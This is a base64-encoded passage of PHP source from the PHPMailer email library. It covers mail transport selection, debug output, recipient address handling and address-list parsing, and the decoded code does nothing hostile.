aW1zIHRvIGJlIHNlbmRtYWlsKSwgZG9uJ3QgcGFzcyBwYXJhbXMgKG5vdCBhIHBlcmZlY3QgZml4LAogICAgICogYnV0IGl0IHdpbGwgZG8pLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgICAgICAkdG8gICAgICBUbwogICAgICogQHBhcmFtIHN0cmluZyAgICAgICRzdWJqZWN0IFN1YmplY3QKICAgICAqIEBwYXJhbSBzdHJpbmcgICAgICAkYm9keSAgICBNZXNzYWdlIEJvZHkKICAgICAqIEBwYXJhbSBzdHJpbmcgICAgICAkaGVhZGVyICBBZGRpdGlvbmFsIEhlYWRlcihzKQogICAgICogQHBhcmFtIHN0cmluZ3xudWxsICRwYXJhbXMgIFBhcmFtcwogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwcml2YXRlIGZ1bmN0aW9uIG1haWxQYXNzdGhydSgkdG8sICRzdWJqZWN0LCAkYm9keSwgJGhlYWRlciwgJHBhcmFtcykKICAgIHsKICAgICAgICAvL0NoZWNrIG92ZXJsb2FkaW5nIG9mIG1haWwgZnVuY3Rpb24gdG8gYXZvaWQgZG91YmxlLWVuY29kaW5nCiAgICAgICAgaWYgKGluaV9nZXQoJ21ic3RyaW5nLmZ1bmNfb3ZlcmxvYWQnKSAmIDEpIHsKICAgICAgICAgICAgJHN1YmplY3QgPSAkdGhpcy0+c2VjdXJlSGVhZGVyKCRzdWJqZWN0KTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkc3ViamVjdCA9ICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcigkc3ViamVjdCkpOwogICAgICAgIH0KICAgICAgICAvL0NhbGxpbmcgbWFpbCgpIHdpdGggbnVsbCBwYXJhbXMgYnJlYWtzCiAgICAgICAgaWYgKCEkdGhpcy0+VXNlU2VuZG1haWxPcHRpb25zIG9yIG51bGwgPT09ICRwYXJhbXMpIHsKICAgICAgICAgICAgJHJlc3VsdCA9IEBtYWlsKCR0bywgJHN1YmplY3QsICRib2R5LCAkaGVhZGVyKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkcmVzdWx0ID0gQG1haWwoJHRvLCAkc3ViamVjdCwgJGJvZHksICRoZWFkZXIsICRwYXJhbXMpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJHJlc3VsdDsKICAgIH0KICAgIC8qKgogICAgICogT3V0cHV0IGRlYnVnZ2luZyBpbmZvIHZpYSB1c2VyLWRlZmluZWQgbWV0aG9kLgogICAgICogT25seSBnZW5lcmF0ZXMgb3V0cHV0IGlmIFNNVFAgZGVidWcgb3V0cHV0IGlzIGVuYWJsZWQgKEBzZWUgU01UUDo6JGRvX2RlYnVnKS4KICAgICAqCiAgICAgKiBAc2VlIFBIUE1haWxlcjo6JERlYnVnb3V0cHV0CiAgICAgKiBAc2VlIFBIUE1haWxlcjo6JFNNVFBEZWJ1ZwogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0cgogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZWRlYnVnKCRzdHIpCiAgICB7CiAgICAgICAgaWYgKCR0aGlzLT5TTVRQRGVidWcgPD0gMCkgewogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIC8vSXMgdGhpcyBhIFBTUi0zIGxvZ2dlcj8KICAgICAgICBpZiAoJHRoaXMtPkRlYnVnb3V0cHV0IGluc3RhbmNlb2YgXFBzclxMb2dcTG9nZ2VySW50ZXJmYWNlKSB7CiAgICAgICAgICAgICR0aGlzLT5EZWJ1Z291dHB1dC0+ZGVidWcoJHN0cik7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICAgICAgLy9Bdm9pZCBjbGFzaCB3aXRoIGJ1aWx0LWluIGZ1bmN0aW9uIG5hbWVzCiAgICAgICAgaWYgKCFpbl9hcnJheSgkdGhpcy0+RGVidWdvdXRwdXQsIFsnZXJyb3JfbG9nJywgJ2h0bWwnLCAnZWNobyddKSBhbmQgaXNfY2FsbGFibGUoJHRoaXMtPkRlYnVnb3V0cHV0KSkgewogICAgICAgICAgICBjYWxsX3VzZXJfZnVuYygkdGhpcy0+RGVidWdvdXRwdXQsICRzdHIsICR0aGlzLT5TTVRQRGVidWcpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIHN3aXRjaCAoJHRoaXMtPkRlYnVnb3V0cHV0KSB7CiAgICAgICAgICAgIGNhc2UgJ2Vycm9yX2xvZyc6CiAgICAgICAgICAgICAgICAvL0Rvbid0IG91dHB1dCwganVzdCBsb2cKICAgICAgICAgICAgICAgIGVycm9yX2xvZygkc3RyKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdodG1sJzoKICAgICAgICAgICAgICAgIC8vQ2xlYW5zIHVwIG91dHB1dCBhIGJpdCBmb3IgYSBiZXR0ZXIgbG9va2luZywgSFRNTC1zYWZlIG91dHB1dAogICAgICAgICAgICAgICAgZWNobyBodG1sZW50aXRpZXMoCiAgICAgICAgICAgICAgICAgICAgcHJlZ19yZXBsYWNlKCcvW1xyXG5dKy8nLCAnJywgJHN0ciksCiAgICAgICAgICAgICAgICAgICAgRU5UX1FVT1RFUywKICAgICAgICAgICAgICAgICAgICAnVVRGLTgnCiAgICAgICAgICAgICAgICApLCAiPGJyPlxuIjsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdlY2hvJzoKICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgIC8vTm9ybWFsaXplIGxpbmUgYnJlYWtzCiAgICAgICAgICAgICAgICAkc3RyID0gcHJlZ19yZXBsYWNlKCcvXHJcbnxcci9tcycsICJcbiIsICRzdHIpOwogICAgICAgICAgICAgICAgZWNobyBnbWRhdGUoJ1ktbS1kIEg6aTpzJyksCiAgICAgICAgICAgICAgICAiXHQiLAogICAgICAgICAgICAgICAgICAgIC8vVHJpbSB0cmFpbGluZyBzcGFjZQogICAgICAgICAgICAgICAgdHJpbSgKICAgICAgICAgICAgICAgIC8vSW5kZW50IGZvciByZWFkYWJpbGl0eSwgZXhjZXB0IGZvciB0cmFpbGluZyBicmVhawogICAgICAgICAgICAgICAgICAgIHN0cl9yZXBsYWNlKAogICAgICAgICAgICAgICAgICAgICAgICAiXG4iLAogICAgICAgICAgICAgICAgICAgICAgICAiXG4gICAgICAgICAgICAgICAgICAgXHQgICAgICAgICAgICAgICAgICAiLAogICAgICAgICAgICAgICAgICAgICAgICB0cmltKCRzdHIpCiAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgKSwKICAgICAgICAgICAgICAgICJcbiI7CiAgICAgICAgfQogICAgfQogICAgLyoqCiAgICAgKiBTZXRzIG1lc3NhZ2UgdHlwZSB0byBIVE1MIG9yIHBsYWluLgogICAgICoKICAgICAqIEBwYXJhbSBib29sICRpc0h0bWwgVHJ1ZSBmb3IgSFRNTCBtb2RlCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBpc0hUTUwoJGlzSHRtbCA9IHRydWUpCiAgICB7CiAgICAgICAgaWYgKCRpc0h0bWwpIHsKICAgICAgICAgICAgJHRoaXMtPkNvbnRlbnRUeXBlID0gc3RhdGljOjpDT05URU5UX1RZUEVfVEVYVF9IVE1MOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICR0aGlzLT5Db250ZW50VHlwZSA9IHN0YXRpYzo6Q09OVEVOVF9UWVBFX1BMQUlOVEVYVDsKICAgICAgICB9CiAgICB9CiAgICAvKioKICAgICAqIFNlbmQgbWVzc2FnZXMgdXNpbmcgU01UUC4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGlzU01UUCgpCiAgICB7CiAgICAgICAgJHRoaXMtPk1haWxlciA9ICdzbXRwJzsKICAgIH0KICAgIC8qKgogICAgICogU2VuZCBtZXNzYWdlcyB1c2luZyBQSFAncyBtYWlsKCkgZnVuY3Rpb24uCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBpc01haWwoKQogICAgewogICAgICAgICR0aGlzLT5NYWlsZXIgPSAnbWFpbCc7CiAgICB9CiAgICAvKioKICAgICAqIFNlbmQgbWVzc2FnZXMgdXNpbmcgJFNlbmRtYWlsLgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gaXNTZW5kbWFpbCgpCiAgICB7CiAgICAgICAgJGluaV9zZW5kbWFpbF9wYXRoID0gaW5pX2dldCgnc2VuZG1haWxfcGF0aCcpOwogICAgICAgIGlmIChmYWxzZSA9PT0gc3RyaXBvcygkaW5pX3NlbmRtYWlsX3BhdGgsICdzZW5kbWFpbCcpKSB7CiAgICAgICAgICAgICR0aGlzLT5TZW5kbWFpbCA9ICcvdXNyL3NiaW4vc2VuZG1haWwnOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICR0aGlzLT5TZW5kbWFpbCA9ICRpbmlfc2VuZG1haWxfcGF0aDsKICAgICAgICB9CiAgICAgICAgJHRoaXMtPk1haWxlciA9ICdzZW5kbWFpbCc7CiAgICB9CiAgICAvKioKICAgICAqIFNlbmQgbWVzc2FnZXMgdXNpbmcgcW1haWwuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBpc1FtYWlsKCkKICAgIHsKICAgICAgICAkaW5pX3NlbmRtYWlsX3BhdGggPSBpbmlfZ2V0KCdzZW5kbWFpbF9wYXRoJyk7CiAgICAgICAgaWYgKGZhbHNlID09PSBzdHJpcG9zKCRpbmlfc2VuZG1haWxfcGF0aCwgJ3FtYWlsJykpIHsKICAgICAgICAgICAgJHRoaXMtPlNlbmRtYWlsID0gJy92YXIvcW1haWwvYmluL3FtYWlsLWluamVjdCc7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHRoaXMtPlNlbmRtYWlsID0gJGluaV9zZW5kbWFpbF9wYXRoOwogICAgICAgIH0KICAgICAgICAkdGhpcy0+TWFpbGVyID0gJ3FtYWlsJzsKICAgIH0KICAgIC8qKgogICAgICogQWRkIGEgIlRvIiBhZGRyZXNzLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJlc3MgVGhlIGVtYWlsIGFkZHJlc3MgdG8gc2VuZCB0bwogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZQogICAgICoKICAgICAqIEB0aHJvd3MgRXhjZXB0aW9uCiAgICAgKgogICAgICogQHJldHVybiBib29sIHRydWUgb24gc3VjY2VzcywgZmFsc2UgaWYgYWRkcmVzcyBhbHJlYWR5IHVzZWQgb3IgaW52YWxpZCBpbiBzb21lIHdheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkQWRkcmVzcygkYWRkcmVzcywgJG5hbWUgPSAnJykKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPmFkZE9yRW5xdWV1ZUFuQWRkcmVzcygndG8nLCAkYWRkcmVzcywgJG5hbWUpOwogICAgfQogICAgLyoqCiAgICAgKiBBZGQgYSAiQ0MiIGFkZHJlc3MuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcyBUaGUgZW1haWwgYWRkcmVzcyB0byBzZW5kIHRvCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lCiAgICAgKgogICAgICogQHRocm93cyBFeGNlcHRpb24KICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wgdHJ1ZSBvbiBzdWNjZXNzLCBmYWxzZSBpZiBhZGRyZXNzIGFscmVhZHkgdXNlZCBvciBpbnZhbGlkIGluIHNvbWUgd2F5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRDQygkYWRkcmVzcywgJG5hbWUgPSAnJykKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPmFkZE9yRW5xdWV1ZUFuQWRkcmVzcygnY2MnLCAkYWRkcmVzcywgJG5hbWUpOwogICAgfQogICAgLyoqCiAgICAgKiBBZGQgYSAiQkNDIiBhZGRyZXNzLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJlc3MgVGhlIGVtYWlsIGFkZHJlc3MgdG8gc2VuZCB0bwogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZQogICAgICoKICAgICAqIEB0aHJvd3MgRXhjZXB0aW9uCiAgICAgKgogICAgICogQHJldHVybiBib29sIHRydWUgb24gc3VjY2VzcywgZmFsc2UgaWYgYWRkcmVzcyBhbHJlYWR5IHVzZWQgb3IgaW52YWxpZCBpbiBzb21lIHdheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkQkNDKCRhZGRyZXNzLCAkbmFtZSA9ICcnKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+YWRkT3JFbnF1ZXVlQW5BZGRyZXNzKCdiY2MnLCAkYWRkcmVzcywgJG5hbWUpOwogICAgfQogICAgLyoqCiAgICAgKiBBZGQgYSAiUmVwbHktVG8iIGFkZHJlc3MuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcyBUaGUgZW1haWwgYWRkcmVzcyB0byByZXBseSB0bwogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZQogICAgICoKICAgICAqIEB0aHJvd3MgRXhjZXB0aW9uCiAgICAgKgogICAgICogQHJldHVybiBib29sIHRydWUgb24gc3VjY2VzcywgZmFsc2UgaWYgYWRkcmVzcyBhbHJlYWR5IHVzZWQgb3IgaW52YWxpZCBpbiBzb21lIHdheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkUmVwbHlUbygkYWRkcmVzcywgJG5hbWUgPSAnJykKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPmFkZE9yRW5xdWV1ZUFuQWRkcmVzcygnUmVwbHktVG8nLCAkYWRkcmVzcywgJG5hbWUpOwogICAgfQogICAgLyoqCiAgICAgKiBBZGQgYW4gYWRkcmVzcyB0byBvbmUgb2YgdGhlIHJlY2lwaWVudCBhcnJheXMgb3IgdG8gdGhlIFJlcGx5VG8gYXJyYXkuIEJlY2F1c2UgUEhQTWFpbGVyCiAgICAgKiBjYW4ndCB2YWxpZGF0ZSBhZGRyZXNzZXMgd2l0aCBhbiBJRE4gd2l0aG91dCBrbm93aW5nIHRoZSBQSFBNYWlsZXI6OiRDaGFyU2V0ICh0aGF0IGNhbiBzdGlsbAogICAgICogYmUgbW9kaWZpZWQgYWZ0ZXIgY2FsbGluZyB0aGlzIGZ1bmN0aW9uKSwgYWRkaXRpb24gb2Ygc3VjaCBhZGRyZXNzZXMgaXMgZGVsYXllZCB1bnRpbCBzZW5kKCkuCiAgICAgKiBBZGRyZXNzZXMgdGhhdCBoYXZlIGJlZW4gYWRkZWQgYWxyZWFkeSByZXR1cm4gZmFsc2UsIGJ1dCBkbyBub3QgdGhyb3cgZXhjZXB0aW9ucy4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRraW5kICAgIE9uZSBvZiAndG8nLCAnY2MnLCAnYmNjJywgb3IgJ1JlcGx5VG8nCiAgICAgKiBAcGFyYW0gc3RyaW5nICRhZGRyZXNzIFRoZSBlbWFpbCBhZGRyZXNzIHRvIHNlbmQsIHJlc3AuIHRvIHJlcGx5IHRvCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lCiAgICAgKgogICAgICogQHRocm93cyBFeGNlcHRpb24KICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wgdHJ1ZSBvbiBzdWNjZXNzLCBmYWxzZSBpZiBhZGRyZXNzIGFscmVhZHkgdXNlZCBvciBpbnZhbGlkIGluIHNvbWUgd2F5CiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBhZGRPckVucXVldWVBbkFkZHJlc3MoJGtpbmQsICRhZGRyZXNzLCAkbmFtZSkKICAgIHsKICAgICAgICAkYWRkcmVzcyA9IHRyaW0oJGFkZHJlc3MpOwogICAgICAgICRuYW1lID0gdHJpbShwcmVnX3JlcGxhY2UoJy9bXHJcbl0rLycsICcnLCAkbmFtZSkpOyAvL1N0cmlwIGJyZWFrcyBhbmQgdHJpbQogICAgICAgICRwb3MgPSBzdHJycG9zKCRhZGRyZXNzLCAnQCcpOwogICAgICAgIGlmIChmYWxzZSA9PT0gJHBvcykgewogICAgICAgICAgICAvLyBBdC1zaWduIGlzIG1pc3NpbmcuCiAgICAgICAgICAgICRlcnJvcl9tZXNzYWdlID0gc3ByaW50ZignJXMgKCVzKTogJXMnLAogICAgICAgICAgICAgICAgJHRoaXMtPmxhbmcoJ2ludmFsaWRfYWRkcmVzcycpLAogICAgICAgICAgICAgICAgJGtpbmQsCiAgICAgICAgICAgICAgICAkYWRkcmVzcyk7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgJHBhcmFtcyA9IFska2luZCwgJGFkZHJlc3MsICRuYW1lXTsKICAgICAgICAvLyBFbnF1ZXVlIGFkZHJlc3NlcyB3aXRoIElETiB1bnRpbCB3ZSBrbm93IHRoZSBQSFBNYWlsZXI6OiRDaGFyU2V0LgogICAgICAgIGlmICgkdGhpcy0+aGFzOGJpdENoYXJzKHN1YnN0cigkYWRkcmVzcywgKyskcG9zKSkgYW5kIHN0YXRpYzo6aWRuU3VwcG9ydGVkKCkpIHsKICAgICAgICAgICAgaWYgKCdSZXBseS1UbycgIT0gJGtpbmQpIHsKICAgICAgICAgICAgICAgIGlmICghYXJyYXlfa2V5X2V4aXN0cygkYWRkcmVzcywgJHRoaXMtPlJlY2lwaWVudHNRdWV1ZSkpIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+UmVjaXBpZW50c1F1ZXVlWyRhZGRyZXNzXSA9ICRwYXJhbXM7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBpZiAoIWFycmF5X2tleV9leGlzdHMoJGFkZHJlc3MsICR0aGlzLT5SZXBseVRvUXVldWUpKSB7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlJlcGx5VG9RdWV1ZVskYWRkcmVzc10gPSAkcGFyYW1zOwogICAgICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgLy8gSW1tZWRpYXRlbHkgYWRkIHN0YW5kYXJkIGFkZHJlc3NlcyB3aXRob3V0IElETi4KICAgICAgICByZXR1cm4gY2FsbF91c2VyX2Z1bmNfYXJyYXkoWyR0aGlzLCAnYWRkQW5BZGRyZXNzJ10sICRwYXJhbXMpOwogICAgfQogICAgLyoqCiAgICAgKiBBZGQgYW4gYWRkcmVzcyB0byBvbmUgb2YgdGhlIHJlY2lwaWVudCBhcnJheXMgb3IgdG8gdGhlIFJlcGx5VG8gYXJyYXkuCiAgICAgKiBBZGRyZXNzZXMgdGhhdCBoYXZlIGJlZW4gYWRkZWQgYWxyZWFkeSByZXR1cm4gZmFsc2UsIGJ1dCBkbyBub3QgdGhyb3cgZXhjZXB0aW9ucy4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRraW5kICAgIE9uZSBvZiAndG8nLCAnY2MnLCAnYmNjJywgb3IgJ1JlcGx5VG8nCiAgICAgKiBAcGFyYW0gc3RyaW5nICRhZGRyZXNzIFRoZSBlbWFpbCBhZGRyZXNzIHRvIHNlbmQsIHJlc3AuIHRvIHJlcGx5IHRvCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lCiAgICAgKgogICAgICogQHRocm93cyBFeGNlcHRpb24KICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wgdHJ1ZSBvbiBzdWNjZXNzLCBmYWxzZSBpZiBhZGRyZXNzIGFscmVhZHkgdXNlZCBvciBpbnZhbGlkIGluIHNvbWUgd2F5CiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBhZGRBbkFkZHJlc3MoJGtpbmQsICRhZGRyZXNzLCAkbmFtZSA9ICcnKQogICAgewogICAgICAgIGlmICghaW5fYXJyYXkoJGtpbmQsIFsndG8nLCAnY2MnLCAnYmNjJywgJ1JlcGx5LVRvJ10pKSB7CiAgICAgICAgICAgICRlcnJvcl9tZXNzYWdlID0gc3ByaW50ZignJXM6ICVzJywKICAgICAgICAgICAgICAgICR0aGlzLT5sYW5nKCdJbnZhbGlkIHJlY2lwaWVudCBraW5kJyksCiAgICAgICAgICAgICAgICAka2luZCk7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgaWYgKCFzdGF0aWM6OnZhbGlkYXRlQWRkcmVzcygkYWRkcmVzcykpIHsKICAgICAgICAgICAgJGVycm9yX21lc3NhZ2UgPSBzcHJpbnRmKCclcyAoJXMpOiAlcycsCiAgICAgICAgICAgICAgICAkdGhpcy0+bGFuZygnaW52YWxpZF9hZGRyZXNzJyksCiAgICAgICAgICAgICAgICAka2luZCwKICAgICAgICAgICAgICAgICRhZGRyZXNzKTsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICBpZiAoJ1JlcGx5LVRvJyAhPSAka2luZCkgewogICAgICAgICAgICBpZiAoIWFycmF5X2tleV9leGlzdHMoc3RydG9sb3dlcigkYWRkcmVzcyksICR0aGlzLT5hbGxfcmVjaXBpZW50cykpIHsKICAgICAgICAgICAgICAgICR0aGlzLT57JGtpbmR9W10gPSBbJGFkZHJlc3MsICRuYW1lXTsKICAgICAgICAgICAgICAgICR0aGlzLT5hbGxfcmVjaXBpZW50c1tzdHJ0b2xvd2VyKCRhZGRyZXNzKV0gPSB0cnVlOwogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpZiAoIWFycmF5X2tleV9leGlzdHMoc3RydG9sb3dlcigkYWRkcmVzcyksICR0aGlzLT5SZXBseVRvKSkgewogICAgICAgICAgICAgICAgJHRoaXMtPlJlcGx5VG9bc3RydG9sb3dlcigkYWRkcmVzcyldID0gWyRhZGRyZXNzLCAkbmFtZV07CiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CiAgICAvKioKICAgICAqIFBhcnNlIGFuZCB2YWxpZGF0ZSBhIHN0cmluZyBjb250YWluaW5nIG9uZSBvciBtb3JlIFJGQzgyMi1zdHlsZSBjb21tYS1zZXBhcmF0ZWQgZW1haWwgYWRkcmVzc2VzCiAgICAgKiBvZiB0aGUgZm9ybSAiZGlzcGxheSBuYW1lIDxhZGRyZXNzPiIgaW50byBhbiBhcnJheSBvZiBuYW1lL2FkZHJlc3MgcGFpcnMuCiAgICAgKiBVc2VzIHRoZSBpbWFwX3JmYzgyMl9wYXJzZV9hZHJsaXN0IGZ1bmN0aW9uIGlmIHRoZSBJTUFQIGV4dGVuc2lvbiBpcyBhdmFpbGFibGUuCiAgICAgKiBOb3RlIHRoYXQgcXVvdGVzIGluIHRoZSBuYW1lIHBhcnQgYXJlIHJlbW92ZWQuCiAgICAgKgogICAgICogQHNlZSAgICBodHRwOi8vd3d3LmFuZHJldy5jbXUuZWR1L3VzZXIvYWdyZWVuMS90ZXN0aW5nL21yYnMvd2ViL01haWwvUkZDODIyLnBocCBBIG1vcmUgY2FyZWZ1bCBpbXBsZW1lbnRhdGlvbgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJzdHIgVGhlIGFkZHJlc3MgbGlzdCBzdHJpbmcKICAgICAqIEBwYXJhbSBib29sICAgJHVzZWltYXAgV2hldGhlciB0byB1c2UgdGhlIElNQVAgZXh0ZW5zaW9uIHRvIHBhcnNlIHRoZSBsaXN0CiAgICAgKgogICAgICogQHJldHVybiBhcnJheQogICAgICovCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIHBhcnNlQWRkcmVzc2VzKCRhZGRyc3RyLCAkdXNlaW1hcCA9IHRydWUpCiAgICB7CiAgICAgICAgJGFkZHJlc3NlcyA9IFtdOwogICAgICAgIGlmICgkdXNlaW1hcCBhbmQgZnVuY3Rpb25fZXhpc3RzKCdpbWFwX3JmYzgyMl9wYXJzZV9hZHJsaXN0JykpIHsKICAgICAgICAgICAgLy9Vc2UgdGhpcyBidWlsdC1pbiBwYXJzZXIgaWYgaXQncyBhdmFpbGFibGUKICAgICAgICAgICAgJGxpc3QgPSBpbWFwX3JmYzgyMl9wYXJzZV9hZHJsaXN0KCRhZGRyc3RyLCAnJyk7CiAgICAgICAgICAgIGZvcmVhY2ggKCRsaXN0IGFzICRhZGRyZXNzKSB7CiAgICAgICAgICAgICAgICBpZiAoJy5TWU5UQVgtRVJST1IuJyAhPSAkYWRkcmVzcy0+aG9zdCkgewogICAgICAgICAgICAgICAgICAgIGlmIChzdGF0aWM6OnZhbGlkYXRlQWRkcmVzcygkYWRkcmVzcy0+bWFpbGJveCAuICdAJyAuICRhZGRyZXNzLT5ob3N0KSkgewogICAgICAgICAgICAgICAgICAgICAgICAkYWRkcmVzc2VzW10gPSBbCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZScgPT4gKHByb3BlcnR5X2V4aXN0cygkYWRkcmVzcywgJ3BlcnNvbmFsJykgPyAkYWRkcmVzcy0+cGVyc29uYWwgOiAnJyksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnYWRkcmVzcycgPT4gJGFkZHJlc3MtPm1haWxib3ggLiAnQCcgLiAkYWRkcmVzcy0+aG9zdCwKICAgICAgICAgICAgICAgICAgICAgICAgXTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAvL1VzZSB0aGlzIHNpbXBsZXIgcGFyc2VyCiAgICAgICAgICAgICRsaXN0ID0gZXhwbG9kZSgnLCcsICRhZGRyc3RyKTsKICAgICAgICAgICAgZm9yZWFjaCAoJGxpc3QgYXMgJGFkZHJlc3MpIHsKICAgICAgICAgICAgICAgICRhZGRyZXNzID0gdHJpbSgkYWRkcmVzcyk7CiAgICAgICAgICAgICAgICAvL0lzIHRoZXJlIGEgc2VwYXJhdGUgbmFtZSBwYXJ0PwogICAgICAgICAgICAgICAgaWYgKHN0cnBvcygkYWRkcmVzcywgJzwnKSA9PT0gZmFsc2UpIHsKICAgICAgICAgICAgICAgICAgICAvL05vIHNlcGFyYXRlIG5hbWUsIGp1c3QgdXNlIHRoZSB3aG9sZSB0aGluZwogICAgICAgICAgICAgICAgICAgIGlmIChzdGF0aWM6OnZhbGlkYXRlQWRkcmVzcygkYWRkcmVzcykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGFkZHJlc3Nlc1tdID0gWwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnID0+ICcnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2FkZHJlc3MnID0+ICRhZGRyZXNzLAogICAgICAgICAgICAgICAgICAgICAgICBdOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgbGlzdCgkbmFtZSwgJGVtYWlsKSA9IGV4cGxvZGUoJzwnLCAkYWRkcmVzcyk7CiAgICAgICAgICAgICAgICAgICAgJGVtYWlsID0gdHJpbShzdHJfcmVwbGFjZSgnPicsICcnLCAkZW1haWwpKTsKICAgICAgICAgICAgICAgICAgICBpZiAoc3RhdGljOjp2YWxpZGF0ZUFkZHJlc3MoJGVtYWlsKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkYWRkcmVzc2VzW10gPSBbCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZScgPT4gdHJpbShzdHJfcmVwbGFjZShbJyInLCAiJyJdLCAnJywgJG5hbWUpKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdhZGRyZXNzJyA9PiAkZW1haWwsCiAgICAgICAgICAgICAgICAgICAgICAgIF07CiAgICAgICAg